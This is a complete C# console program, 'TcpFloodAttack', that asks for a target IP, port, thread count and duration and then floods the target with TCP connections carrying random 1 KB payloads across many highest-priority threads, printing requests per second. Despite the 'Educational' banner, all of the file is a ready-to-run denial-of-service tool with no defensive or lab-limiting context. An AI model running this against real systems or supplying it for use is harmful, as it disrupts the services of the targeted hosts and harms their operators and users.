using System.Net.Sockets;
using System.Net;
using System.Diagnostics;

class TcpFloodAttack
{
    private static volatile bool _running = false;
    private static long _totalRequests = 0;
    private static long _lastRequestCount = 0;
    private static Stopwatch _stopwatch = Stopwatch.StartNew();

    static void Main(string[] args)
    {
        Console.WriteLine("Educational TCP Flood Example");
        Console.Write("IP Address: ");
        string ip = Console.ReadLine()!;

        Console.Write("Port: ");
        int port = int.Parse(Console.ReadLine()!);

        Console.Write("Thread Count: ");
        int threadCount = int.Parse(Console.ReadLine()!);

        Console.Write("Attack Duration (seconds, 0 for infinite): ");
        int duration = int.Parse(Console.ReadLine()!);

        Console.WriteLine("Press any key to start...");
        Console.ReadKey();

        StartAttack(ip, port, threadCount, duration);
    }

    static void StartAttack(string ip, int port, int threadCount, int duration)
    {
        _running = true;
        _totalRequests = 0;
        _lastRequestCount = 0;
        _stopwatch.Restart();

        Thread[] threads = new Thread[threadCount];

        Thread statsThread = new Thread(() =>
        {
            long lastTime = 0;
            while (_running)
            {
                Thread.Sleep(1000);
                long currentTotal = Interlocked.Read(ref _totalRequests);
                long currentTime = _stopwatch.ElapsedMilliseconds / 1000;

                if (currentTime > lastTime)
                {
                    long requestsPerSecond = currentTotal - _lastRequestCount;
                    _lastRequestCount = currentTotal;

                    Console.WriteLine($"[{currentTime}s] Requests: {currentTotal} | RPS: {requestsPerSecond}");
                    lastTime = currentTime;
                }
            }
        });
        statsThread.Priority = ThreadPriority.BelowNormal;
        statsThread.Start();

        for (int i = 0; i < threadCount; i++)
        {
            threads[i] = new Thread(() => FloodWorker(ip, port));
            threads[i].Priority = ThreadPriority.Highest;
            threads[i].Start();

            if (i % 100 == 0 && i > 0)
                Thread.Sleep(1);
        }

        Console.WriteLine($"Attack started with {threadCount} threads...");

        if (duration > 0)
        {
            Thread.Sleep(duration * 1000);
            _running = false;
            Console.WriteLine($"Attack stopped after {duration} seconds.");
        }
        else
        {
            Console.WriteLine("Press any key to stop...");
            Console.ReadKey();
            _running = false;
        }

        foreach (var thread in threads)
        {
            thread.Join(3000);
        }

        statsThread.Join(1000);

        Console.WriteLine($"Total requests: {Interlocked.Read(ref _totalRequests)}");
        Console.WriteLine("Attack finished.");
    }

    static void FloodWorker(string ip, int port)
    {
        byte[] buffer = new byte[1024];
        Random rand = new Random(Environment.TickCount ^ Thread.CurrentThread.ManagedThreadId);

        byte[][] buffers = new byte[10][];
        for (int i = 0; i < buffers.Length; i++)
        {
            buffers[i] = new byte[1024];
            rand.NextBytes(buffers[i]);
        }

        int bufferIndex = 0;

        while (_running)
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    socket.SendTimeout = 500;
                    socket.ReceiveTimeout = 500;

                    IAsyncResult result = socket.BeginConnect(ip, port, null, null);
                    bool connected = result.AsyncWaitHandle.WaitOne(1000, true);

                    if (connected && socket.Connected)
                    {
                        socket.EndConnect(result);

                        bufferIndex = (bufferIndex + 1) % buffers.Length;
                        byte[] currentBuffer = buffers[bufferIndex];

                        int sent = socket.Send(currentBuffer, 0, currentBuffer.Length, SocketFlags.None);

                        if (sent > 0)
                        {
                            Interlocked.Increment(ref _totalRequests);
                        }

                        try
                        {
                            socket.Shutdown(SocketShutdown.Both);
                        }
                        catch { }
                    }
                }
            }
            catch
            {
            }

            if (Thread.CurrentThread.ManagedThreadId % 10 == 0)
                Thread.SpinWait(10);
        }
    }
}